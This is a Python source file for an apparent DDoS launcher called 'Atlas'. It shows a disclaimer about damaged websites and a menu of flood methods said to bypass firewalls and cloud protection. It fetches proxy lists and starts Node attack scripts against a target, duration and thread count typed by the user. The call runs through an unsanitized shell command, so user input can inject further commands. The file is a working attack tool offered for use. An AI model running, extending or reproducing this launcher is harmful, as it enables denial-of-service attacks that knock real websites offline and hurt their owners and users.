import os
import sys
import time
from subprocess import run
from time import sleep
from shutil import which

try:
	requests = __import__("httpx") # httpx is faster than requests
	from colorama import Fore, Back, Style
	from rich.console import Console
except Exception:
	exit("[X] Error? try this pip3 install requirements.txt")

console = Console()
tasks = [f"task {n}" for n in range(1, 3)]
with console.status("[bold green]Finding missing on files...") as status:
	while tasks:
		task = tasks.pop(0)
		sleep(1)
		console.log(f"{task} complete")
		try:
			with open("key.txt"):
				open("requirements.txt")
				open("install.sh")
				print("[X] All files Scanned Completed!")
		except IOError:
			exit("[X] Some files does not exist, Please install again!")


def getproxy() -> None:
#	print("[+] Checking Proxy Providers...")
	print("[+] Please wait...")
	with open("proxy_providers.txt", mode="r") as readurl:
#		print("[+] Downloading Proxies...")
		for url in readurl:
			url = url.strip()
			with open("proxies.txt", mode="a") as file:
				try:
					file.write(requests.get(url, timeout=1000).text)
				except requests.ConnectError:
					exit("[X] Connection Error")
				except KeyboardInterrupt:
					exit()
		print("[+] Attack Sent Successfully!!")
		print("[+] Type 'STOP' to stop your Attack.")


def OSclear():
	os.system('clear' if os.name == 'posix' else 'cls')


def unavail():
	print("""
╔════════════════════════════════════════════════════════════════════════╗
║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
╚════════════════════════════════════════════════════════════════════════╝
    """)
 
def tos():
	print("""\033[1;31;40m
╔════════════════════════════════════════════════════════════════════════╗
║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
╠════════════════════════════════════════════════════════════════════════╣
║ FROM ATLAS ADMIN:                                                      ║
║ We are not responsible.                                                ║
║ if any of you who do not own a website are damaged,                    ║ 
║ before you use this tool you must accept our TOS, for confirmation     ║  
║ and a promise that we will not be held responsible for the             ║ 
║ damage you have done to the damaged website.                           ║
╚════════════════════════════════════════════════════════════════════════╝

    """)
	while 1:
		accept = input("Do you agree in our TOS [Y/N]: ")
		if accept in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif accept in ["n", "N", "no", "NO"]:
			sleep(2)
			exit("GOODBYE")
		elif accept in "":
			pass
		else:
			OSclear()
			tos()


def banner():
	print("""\033[1;32;40m
    \033[1;31;40m-- [ \033[2;30;42mCONNECTION ESTABLISHED\033[1;31;40m ] --\033[1;32;40m
        ╔═╗╔╦╗╦  ╔═╗╔═╗   ╔═╗╦ ╦
        ╠═╣ ║ ║  ╠═╣╚═╗───╠═╝╠═╣
        ╩ ╩ ╩ ╩═╝╩ ╩╚═╝   ╩  ╩ ╩\033[1;31;40m
     -- \033[1;32;40mFOCKET \033[1;31;40m & \033[1;32;40mFOCKET \033[1;31;40m & \033[1;32;40mFOCKET \033[1;31;40m -- 
      Type dev to see who develop
    """)

def repeater():
	while 1:
		repeat = input("[Atlas Bot] Do you want to go back to menu? [Y/N]: ")
		if repeat in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif repeat in ["n", "N", "no", "NO"]:
			exit()
		elif repeat in "":
			pass
		else:
			OSclear()
			menu()


def menu():
	OSclear()
	banner()
	print("""
╔════════════════════════════════════════════════════════════╗
║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
║    [3] FILE UPDATE \033[1;32;40m[You can see new updates in our Files]  \033[1;31;40m║
╚════════════════════════════════════════════════════════════╝

    """)
	while 1:
		choose1 = input("atlas-api@free@#~> ")
		if choose1 in ["1", "user", "userinfo", "info"]:
			userinfo()
		elif choose1 in ["2", "methods", "METHODS"]:
			launchflood()
		elif choose1 in ["3", "fileupdate", "update"]:
			fileupdate()
		elif choose1 in ["dev", "developer"]:
			developer()
		elif (choose1 == ""):
			pass

#UserINFO
def userinfo():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     USER TYPE: \033[1;32;40mFREE-USER        \033[1;31;40m                           ║
║     ADMIN PERM: \033[1;32;40mNO PERMISSION     \033[1;31;40m                         ║
║     ATTACK TIME: \033[1;32;40mUNLIMITED       \033[1;31;40m                          ║
║     USER EXPIRATION: \033[1;32;40mJanuary 1, 2038    \033[1;31;40m                   ║
║     METHODS ACCESS: \033[1;32;40mTRUE              \033[1;31;40m                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    repeater()

def methodbanner():
	print("""
╔═════════════════╦═══════════════════════╦══════════════════════╦═════════════════════╗
║    \033[1;37;40mMETHODS      \033[1;31;40m║      \033[1;37;40mINFORMATION      \033[1;31;40m║      \033[1;37;40mPERMISSION      \033[1;31;40m║       \033[1;37;40mSTATUS        \033[1;31;40m║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║  \033[1;36;40mhold  \033[1;31;40m║ \033[1;36;40mBYPASS SOME FIREWALLS \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mnuke   \033[1;31;40m║  \033[1;36;40mBYPASS NORMAL CLOUD  \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mmega   \033[1;31;40m║  \033[1;36;40mHTTPS-PROXY ATTACK   \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mmurder    \033[1;31;40m║ \033[1;36;40mBYPASS OVH-DIGI SITES \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╠═════════════════╬═══════════════════════╬══════════════════════╬═════════════════════╣
║   \033[1;36;40mgeo2  \033[1;31;40m║ \033[1;36;40mHTTP/1.3 + GET + POST \033[1;31;40m║      \033[1;36;40mFREE-USER       \033[1;31;40m║      \033[2;30;42mAVAILABLE\033[1;31;40m      ║
╚═════════════════╩═══════════════════════╩══════════════════════╩═════════════════════╝
    """)
  
def launchflood():
	OSclear()
	methodbanner()
	while 1:
		methods = input("[X] Choose Methods: ")
		if methods in ["hold", "atlas-hold"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				getproxy()
				run([f'node hold.js {target} {floodtime} 64 5 proxies.txt proxies.txt'], shell=True)
			except:
				print("Silahkan Tunggu")
		elif methods in ["nuke", "atlas-nuke"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'node nuje.js {target} {floodtime} {thread} proxy.txt 64'], shell=True)
			except:
				print("Silahkan Tunggu")
		elif methods in ["mega", "atlas-mega"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'node mega.js {target} {floodtime} 64 {thread} proxy.txt'], shell=True)
			except:
				print("Silahkan Tunggu")
		elif  methods in ["murder", "atlas-murder"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'node murder.js {target} {floodtime} {thread} proxy.txt 64'], shell=True)
			except:
				print("Silahkan Tunggu")
		elif methods in ["geo2", "atlas-geo2"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [1-5]: "))
				getproxy()
				run([f'node geo2.js {target} {floodtime} 64 {thread} proxy.txt'], shell=True)
			except:
				print("Silahkan Tunggu")
		elif methods in "":
			pass
		elif methods in ["clear", "CLEAR", "cls", "CLS"]:
			OSclear(); methodbanner()
		elif methods in ["stop", "STOP"]:
			run(["pkill screen"], shell=True)
			print("[+] Attack Stopped!")
		else:
		   print("[X] Invalid Method")

#FileUpdates
def fileupdate():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     FILE VERSION: \033[1;32;40mV1 \033[1;31;40m                                      ║
║     LAST UPDATE: \033[1;32;40mFebuari 6, 2024   \033[1;31;40m                       ║
║     NEXT UPDATE: \033[1;32;40mView on my GITHUB llolyppop \033[1;31;40m      ║
╚════════════════════════════════════════════════════════════╝   
    """)
    repeater()

#DeveloperInfo
def developer():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     DEVELOPER: FOCKET                                          ║
║                                                                                              ║        
╚════════════════════════════════════════════════════════════╝

    """)
    repeater()

def main():
	print("[+] Checking Dependencies...\n")
	pkgs = ['screen']
	install = True
	for pkg in pkgs:
		ok = which(pkg)
		if ok == None:
			print(f"[X] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		exit(f'[?] Error? try: sh install.sh')
	else:
		OSclear()
		tos()

if __name__ == "__main__":
	main()
